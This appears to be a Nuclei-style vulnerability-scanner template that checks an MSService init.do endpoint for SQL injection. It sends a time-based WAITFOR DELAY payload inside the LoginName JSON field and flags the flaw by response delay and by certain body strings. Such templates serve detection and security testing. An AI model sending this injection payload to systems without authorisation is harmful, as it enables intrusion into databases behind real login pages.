id: poc-yaml-msservice-init-do-sqli
info:
  name: MSService init.do SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects an SQL injection vulnerability in the MSService `init.do` endpoint.
variables:
  t1: "{{rand_int(5, 10)}}"
  t2: "{{to_number(t1) + 2}}"
http:
  - method: POST
    path:
      - "{{BaseURL}}/init.do"
    headers:
      Content-Type: application/json
    body: |
      {"LoginName":"1001' WAITFOR DELAY '0:0:{{t1}}'-- znSL","password":"123456"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
      - type: word
        words:
          - "用户验证失败"
          - "Authority"
          - "ConsultCenterName"
        part: body
